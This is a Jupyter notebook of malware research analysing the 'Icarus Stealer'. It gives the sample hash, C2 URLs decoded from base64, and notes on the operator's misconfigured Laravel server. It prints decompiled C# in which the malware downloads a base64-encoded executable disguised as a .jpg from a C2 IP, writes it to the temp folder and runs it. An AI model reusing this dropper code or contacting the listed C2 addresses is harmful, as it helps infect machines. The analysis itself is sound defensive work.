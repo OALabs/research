{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "864a2be1-5cb7-4a72-91e4-286c9b9180c5",
   "metadata": {},
   "source": [
    "# Icarus Stealer - What is it?\n",
    "> What is this malware and how does it work\n",
    "\n",
    "- toc: true \n",
    "- badges: true\n",
    "- categories: [icarus,yara,config,dotnet]\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d021f6a6-cb0f-4533-bfcf-3d64a1da8b64",
   "metadata": {},
   "source": [
    "![](https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e7f5580f-94bf-4035-ab1f-31e22507e03c",
   "metadata": {},
   "source": [
    "## Overview\n",
    "\n",
    "### Samples\n",
    "`8e88de63c132f964891dd00501bee5078f27dfcec7ca122f19bd43f9ed933427` [Malware Bazaar](https://bazaar.abuse.ch/sample/8e88de63c132f964891dd00501bee5078f27dfcec7ca122f19bd43f9ed933427/)\n",
    "\n",
    "### References\n",
    "- Malware Sellix [link](https://icarusdevelopment.sellix.io/terms)\n",
    "- Karsten twitter [ref](https://twitter.com/struppigel/status/1566685309093511170)\n",
    "- They have a tutorial video! [video](https://vimeo.com/730741460?embedded=true&source=vimeo_logo&owner=176036178)\n",
    "\n",
    "## Analysis"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "972908c7-cc26-401b-b964-28b51449a082",
   "metadata": {},
   "source": [
    "### C2 \n",
    "The URLs are base64 encoded and link back to the c2 server. In this case the url links to a .jpg file which is infact a base64 endcoded PE.\n",
    "\n",
    "```c#\n",
    "private static void StopRootkit()\n",
    "{\n",
    "\tWebClient webClient = new WebClient();\n",
    "\tStream stream = webClient.OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(\"aHR0cDovLzE5My4zMS4xMTYuMjM5L2NyeXB0L3B1YmxpYy9VcGRhdGVfRG93bmxvYWRzL3JlbW92ZS5qcGc=\")));\n",
    "\tStreamReader streamReader = new StreamReader(stream);\n",
    "\tstring s = streamReader.ReadToEnd();\n",
    "\tbyte[] bytes = Convert.FromBase64String(s);\n",
    "\tFile.WriteAllBytes(Path.GetTempPath() + \"\\\\rkd.exe\", bytes);\n",
    "\tProcess.Start(Path.GetTempPath() + \"\\\\rkd.exe\");\n",
    "\tFile.Delete(Path.GetTempPath() + \"\\\\rkd.exe\");\n",
    "}\n",
    "```\n",
    "\n",
    "#### C2 URLs\n",
    "- `aHR0cDovLzE5My4zMS4xMTYuMjM5L2NyeXB0L3B1YmxpYy9VcGRhdGVfRG93bmxvYWRzL3JlbW92ZS5qcGc=` -> `http://193.31.116.239/crypt/public/Update_Downloads/remove.jpg`\n",
    "- `aHR0cDovLzE5My4zMS4xMTYuMjM5L2NyeXB0L3B1YmxpYy9VcGRhdGVfRG93bmxvYWRzL3J0LmpwZw==` -> `http://193.31.116.239/crypt/public/Update_Downloads/rt.jpg`\n",
    "There are more... \n",
    "\n",
    "### Downloaded Modules\n",
    "\n",
    "#### remove.jpg \n",
    "\n",
    "Deletes the rootkit\n",
    "\n",
    "```c#\n",
    "public static void remove()\n",
    "{\n",
    "\ttry\n",
    "\t{\n",
    "\t\tbool[] array = new bool[2];\n",
    "\t\tarray[0] = true;\n",
    "\t\tforeach (bool flag in array)\n",
    "\t\t{\n",
    "\t\t\tusing (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, flag ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\", true))\n",
    "\t\t\t{\n",
    "\t\t\t\tbool flag2 = (registryKey.GetValue(\"AppInit_DLLs\", \"\") as string).Contains(\"r77-\");\n",
    "\t\t\t\tif (flag2)\n",
    "\t\t\t\t{\n",
    "\t\t\t\t\tregistryKey.SetValue(\"AppInit_DLLs\", \"\");\n",
    "\t\t\t\t}\n",
    "\t\t\t}\n",
    "\t\t}\n",
    "\t}\n",
    "\tcatch (Exception ex)\n",
    "\t{\n",
    "\t}\n",
    "}\n",
    "```\n",
    "#### rt.jpg\n",
    "This is a simple startup function for an open source userland rootkit that can be found on GitHub [r77-rootkit](https://github.com/bytecode77/r77-rootkit).\n",
    "\n",
    "## Server Misconfiguration\n",
    "It's almost like the developer knows they made some mistakes...\n",
    "![](https://i.imgur.com/eXIIX6b.jpg)\n",
    "\n",
    "### Laravel Debugger Exposed\n",
    "A typo in one of the C2 URLs exposed a server error with a full stack trace. This revealed that the developer was uing the [laravel](https://laravel.com/) PHP framework and had left the debugger publically exposed.\n",
    "![](https://i.imgur.com/Mxz6nDx.png)\n",
    "\n",
    "### Open Directory\n",
    "The stack trace led to the discovery that the server root had been configured as an open directory with many files publicly served to the Internet including logs.\n",
    "![](https://i.imgur.com/rU9UYGy.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "76aa2654-5e1b-4b7e-9df0-c957da3c79e6",
   "metadata": {},
   "source": [
    "**Analysis Stopped:** \n",
    "\n",
    "There are more files and download links that could be investigated but the malware is so simple and the server configured so poorly we stopped our analysis. This malware looks more like a hobby project than a professional business..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d9e2ac2-f29f-4a28-b513-562c6508e2b6",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
